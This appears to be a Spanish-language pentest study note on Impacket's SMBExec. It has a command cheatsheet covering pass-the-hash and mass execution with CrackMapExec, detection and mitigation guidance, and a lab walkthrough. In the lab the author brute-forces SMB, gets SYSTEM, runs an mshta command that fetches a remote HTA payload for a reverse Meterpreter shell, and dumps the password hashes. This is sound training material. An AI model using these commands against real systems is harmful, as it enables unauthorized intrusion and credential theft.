
# SMBExec Lateral Movement

#### ¿Qué es SMBExec?

SMBExec es una herramienta de movimiento lateral incluida en el paquete **Impacket**, diseñada para ejecutar comandos de forma remota en sistemas Windows mediante el protocolo SMB (puerto 445). A diferencia de PsExec, SMBExec **no requiere subir un archivo ejecutable** al sistema remoto, lo que la convierte en una opción más sigilosa en ciertos entornos.

#### ¿Cómo funciona SMBExec?

El flujo de trabajo de SMBExec sigue estos pasos:

1. **Autenticación SMB**: Se autentica en el sistema remoto usando credenciales válidas (usuario/contraseña o hash NTLM).
2. **Creación de servicio temporal**: Crea un servicio de Windows temporal a través del Service Control Manager (SCM) mediante RPC sobre SMB.
3. **Ejecución de comandos**: El servicio ejecuta `cmd.exe` con el comando especificado, redirigiendo la salida a un archivo temporal (normalmente `__output` en el recurso `C$`).
4. **Recuperación de resultados**: Lee el contenido del archivo de salida mediante SMB y lo muestra al atacante.
5. **Limpieza**: Elimina el servicio temporal, el archivo de salida y cualquier artefacto generado.

#### 🔑 Diferencias clave: SMBExec vs PsExec

<table data-header-hidden><thead><tr><th width="188.25927734375"></th><th></th><th></th></tr></thead><tbody><tr><td>Característica</td><td>SMBExec</td><td>PsExec</td></tr><tr><td><strong>Subida de archivos</strong></td><td>No sube archivos ejecutables al disco</td><td>Sube un binario (<code>.exe</code>) a <code>ADMIN$</code></td></tr><tr><td><strong>Mecanismo</strong></td><td>Usa servicio temporal que ejecuta <code>cmd.exe</code></td><td>Usa servicio asociado a un binario subido</td></tr><tr><td><strong>Huella en disco</strong></td><td>Mínima (archivos <code>.bat</code> y <code>__output</code> temporales)</td><td>Deja un ejecutable en <code>C:\Windows</code></td></tr><tr><td><strong>Detección</strong></td><td>Menos detectable por antivirus tradicionales</td><td>Fácilmente detectado por antivirus</td></tr><tr><td><strong>Interactividad</strong></td><td>Shell semi-interactiva</td><td>Shell completamente interactiva</td></tr><tr><td><strong>Puertos</strong></td><td>445 (SMB)</td><td>445 (SMB) + 135 (RPC)</td></tr></tbody></table>

***

## <mark style="color:purple;">Cheatsheet</mark>

#### 🔹 Desde Linux con Impacket

<table data-header-hidden><thead><tr><th width="261.88885498046875"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td>Shell semi-interactiva con contraseña</td><td><code>impacket-smbexec DOMAIN/user:'password'@&#x3C;IP></code></td></tr><tr><td>Ejecutar comando único</td><td><code>impacket-smbexec DOMAIN/user:'password'@&#x3C;IP> whoami</code></td></tr><tr><td>Especificar share alternativo (ej. <code>C$</code>)</td><td><code>impacket-smbexec DOMAIN/user:'password'@&#x3C;IP> -share C$</code></td></tr><tr><td>Shell con hash NTLM (Pass-the-Hash)</td><td><code>impacket-smbexec -hashes :&#x3C;HASH_NTLM> DOMAIN/user@&#x3C;IP></code></td></tr><tr><td>Shell con usuario local (sin dominio)</td><td><code>impacket-smbexec user:'password'@&#x3C;IP></code></td></tr><tr><td>Shell con autenticación Kerberos</td><td><code>impacket-smbexec -k -no-pass DOMAIN/user@&#x3C;IP> -dc-ip &#x3C;DC_IP> -target-ip &#x3C;TARGET_IP></code></td></tr></tbody></table>

#### 🔹 Alternativas de Impacket para movimiento lateral

<table data-header-hidden><thead><tr><th width="185.29632568359375"></th><th width="252.851806640625"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Descripción</td><td>Comando ejemplo</td></tr><tr><td><code>impacket-psexec</code></td><td>Shell interactiva, sube binario al disco</td><td><code>impacket-psexec DOMAIN/user:'password'@&#x3C;IP></code></td></tr><tr><td><code>impacket-wmiexec</code></td><td>Usa WMI (puerto 135/RPC), más sigiloso</td><td><code>impacket-wmiexec DOMAIN/user:'password'@&#x3C;IP></code></td></tr><tr><td><code>impacket-atexec</code></td><td>Usa tareas programadas (<code>schtasks</code>)</td><td><code>impacket-atexec DOMAIN/user:'password'@&#x3C;IP> 'whoami'</code></td></tr><tr><td><code>impacket-dcomexec</code></td><td>Usa DCOM, similar a WMIexec</td><td><code>impacket-dcomexec DOMAIN/user:'password'@&#x3C;IP></code></td></tr></tbody></table>

#### 🔹 Herramientas automatizadas

<table data-header-hidden><thead><tr><th width="321.888916015625"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Comando ejemplo</td></tr><tr><td>CrackMapExec (CME) con método smbexec</td><td><code>crackmapexec smb &#x3C;IP> -u user -p pass --exec-method smbexec -x 'whoami'</code></td></tr><tr><td>CrackMapExec con hash (Pass-the-Hash)</td><td><code>crackmapexec smb &#x3C;IP> -u user -H &#x3C;HASH_NTLM> -x 'whoami'</code></td></tr><tr><td>CrackMapExec enumeración de shares</td><td><code>crackmapexec smb &#x3C;IP> -u user -p pass --shares</code></td></tr><tr><td>NetExec (sucesor de CME)</td><td><code>netexec smb &#x3C;IP> -u user -p pass -x whoami</code></td></tr></tbody></table>

#### 🔹 Comandos de enumeración y preparación

<table data-header-hidden><thead><tr><th width="270.77777099609375"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td>Verificar conectividad SMB</td><td><code>crackmapexec smb &#x3C;IP> -u user -p pass</code></td></tr><tr><td>Enumerar usuarios del dominio</td><td><code>impacket-GetADUsers -all -dc-ip &#x3C;DC_IP> DOMAIN/user</code></td></tr><tr><td>Dump de hashes del DC</td><td><code>impacket-secretsdump DOMAIN/user:'password'@&#x3C;DC_IP></code></td></tr><tr><td>Conectar a share SMB manualmente</td><td><code>impacket-smbclient DOMAIN/user:'password'@&#x3C;IP></code></td></tr></tbody></table>

### Resumen rápido de comandos esenciales

```bash
# Shell semi-interactiva con credenciales
impacket-smbexec administrator:'Password123'@192.168.1.10

# Pass-the-Hash (sin contraseña)
impacket-smbexec -hashes :aad3b435b51404eeaad3b435b51404ee administrator@192.168.1.10

# Ejecución masiva con CrackMapExec
crackmapexec smb 192.168.1.0/24 -u admin -H ntlm_hash -x 'whoami'

# Comando único con smbexec
impacket-smbexec DOMAIN/john:'Pass123'@192.168.1.10 'ipconfig'
```

## <mark style="color:purple;">Detección y mitigación</mark>

#### ¿Cómo detectar SMBExec?

**Artefactos en el sistema (host)**:

* **Evento 7045** (creación de servicio) en el Visor de Eventos de Windows
* **Evento 7009** (timeout del servicio)
* **Eventos de seguridad**: 4672 (login privilegiado), 4624 (login exitoso), 4634 (logout)
* Archivo temporal `__output` en `C:\Windows\Temp` o en el share `C$`
* Archivos batch (`*.bat`) temporales ejecutados por `cmd.exe`
* Servicio con nombre genérico como `BTOBTO`

**Indicadores de red**:

* Múltiples conexiones SMB (4 conexiones típicamente) en el puerto 445
* Patrones de tráfico RPC sobre SMB anómalos

#### 🛡️ Mitigaciones

<table data-header-hidden><thead><tr><th width="238.92596435546875"></th><th></th></tr></thead><tbody><tr><td>Medida</td><td>Descripción</td></tr><tr><td><strong>Restringir acceso SMB</strong></td><td>Limitar el tráfico SMB entrante solo a direcciones IP autorizadas</td></tr><tr><td><strong>Evitar administradores locales</strong></td><td>No permitir que cuentas de usuario de dominio estén en el grupo local "Administradores"</td></tr><tr><td><strong>Credential Guard</strong></td><td>Proteger credenciales en memoria para mitigar Pass-the-Hash</td></tr><tr><td><strong>Monitorización activa</strong></td><td>Configurar alertas para eventos 7045 y 4624 anómalos</td></tr><tr><td><strong>Segmentación de red</strong></td><td>Aislar redes y limitar comunicación SMB entre segmentos</td></tr><tr><td><strong>Deshabilitar SMBv1</strong></td><td>Eliminar protocolos obsoletos que facilitan ciertos ataques</td></tr></tbody></table>

***

## <mark style="color:purple;">Lab:</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**SMB Server SMBExec**</mark>

Se le proporciona una máquina Kali GUI y una máquina objetivo que ejecuta un servicio SMB vulnerable. Puede acceder a la máquina objetivo en **`demo.ine.local`**.

Tu tarea consiste en identificar el servicio SMB utilizando las herramientas disponibles en Kali y, posteriormente, usar la herramienta SMBExec para realizar una post-explotación en dicho servicio. SMBExec permite ejecutar comandos sin transferir ningún binario al servidor objetivo. Funciona tanto con recursos compartidos SMB como sin ellos, ejecutando un servidor SMB local.

**Objetivo:** ¡Aprovechar el servicio SMB para instalar un Meterpreter en el objetivo y recuperar la flag!

#### Hosts

Nuestro objetivo es `demo.ine.local`

```bash
┌──(root㉿attackdefense)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.10       attackdefense.com attackdefense
127.0.0.1 AttackDefense-Kali
10.10.41.14     attackdefense.com attackdefense
10.2.25.137    demo.ine.local
```

### Escaneo de puertos

```bash
┌──(root㉿attackdefense)-[~]
└─# nmap -sV demo.ine.local                                                                                                                           

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Vemos que tenemos abierto el puerto 445 SMB, vamos a enumerarlo.

### Escaneo dirigido a SMB

```bash
┌──(root㉿attackdefense)-[~]
└─# nmap -sV -p 445 --script smb-* demo.ine.local

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| smb-protocols: 
|   dialects: 
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-flood: ERROR: Script execution failed (use -d to debug)
| smb-mbenum: 
|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-print-text: false
```

Observamos que en `smb-protocols` tenemos varios disponibles, y no obtenemos nada más de información con los scripts.

### Bruteforce de SMB

{% hint style="info" %}
**Importante**: especificar `smb2` en vez de SMB para que funcione bien el bruteforce
{% endhint %}

```bash
┌──(root㉿attackdefense)-[~]
└─# hydra -l administrator -P /usr/share/wordlists/rockyou.txt.gz 10.2.25.137 smb2
                                                                   
Hydra v9.6dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-09 23:48:47
[WARNING] Workgroup was not specified, using "WORKGROUP"
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking smb2://10.2.25.137:445/
[WARNING] 10.2.25.137 might accept any credential
[445][smb2] host: 10.2.25.137   login: administrator   password: carolina
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-09 23:48:49
```

Encontramos la contraseña del administrador: `carolina`

### SMB Exec

```bash
┌──(root㉿attackdefense)-[~]
└─# impacket-smbexec administrator:carolina@10.2.25.137

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

Observamos que con SMB Exec no podemos movernos libremente con `cd`, por lo que ganaremos una sesión de Meterpreter.

```bash
C:\Windows\system32> cd C:/Users/Administrator
[-] You can't CD under SMBEXEC. Use full paths.
```

### HTA Server

{% code overflow="wrap" %}

```bash
msfconsole
use exploit/windows/misc/hta_server
exploit

[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.41.14:4445 
[*] Using URL: http://10.10.41.14:8080/WUvYzP.hta
[*] Server started.
```

{% endcode %}

En el objetivo ejecutamos el siguiente comando y obtenemos la sesión de Meterpreter como SYSTEM:

```bash
mshta.exe http://10.10.41.14:8080/WUvYzP.hta
```

```bash
[*] Sending stage (176198 bytes) to 10.2.25.137
[*] Meterpreter session 1 opened (10.10.41.14:4445 -> 10.2.25.137:49813) at 2026-04-10 00:00:34 +0530

msf6 exploit(windows/misc/hta_server) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Acceso a la flag

```powershell
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2020-09-25 12:04:38 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2016-07-16 18:48:08 +0530  BOOTNXT
040777/rwxrwxrwx  8192    dir   2020-09-09 10:22:55 +0530  Boot
040777/rwxrwxrwx  0       dir   2016-10-18 07:29:39 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2018-02-23 16:36:05 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2017-12-14 02:30:56 +0530  Program Files
040777/rwxrwxrwx  4096    dir   2020-09-25 12:13:29 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2016-11-24 05:49:28 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2016-10-18 07:31:27 +0530  Recovery
040777/rwxrwxrwx  0       dir   2020-09-25 11:43:59 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2020-09-25 11:45:39 +0530  Users
040777/rwxrwxrwx  28672   dir   2026-04-10 00:00:30 +0530  Windows
040777/rwxrwxrwx  0       dir   2020-09-25 12:11:47 +0530  admin
100444/r--r--r--  388690  fil   2020-09-02 13:52:08 +0530  bootmgr
100666/rw-rw-rw-  32      fil   2020-09-25 22:12:46 +0530  flag.txt
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys
040777/rwxrwxrwx  0       dir   2020-09-25 12:12:16 +0530  public

meterpreter > cat flag.txt 
0903a189cbe112bce4b75bbc********
```

### Extra: Pass the Hash

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:00527325548f776793aabfd5cfe39a78:::
auditor:1012:aad3b435b51404eeaad3b435b51404ee:a23d91ad69cb32adbc0195a25a54ba54:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
demo:1013:aad3b435b51404eeaad3b435b51404ee:1f637fde0d3ee5f09474683d312bd5aa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sysadmin:1011:aad3b435b51404eeaad3b435b51404ee:92b668493ab02a17dbb21616e71b2ae2:::
```

```bash
┌──(root㉿attackdefense)-[~]
└─# impacket-smbexec -hashes :00527325548f776793aabfd5cfe39a78 administrator@10.2.25.137 
                                                              
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```
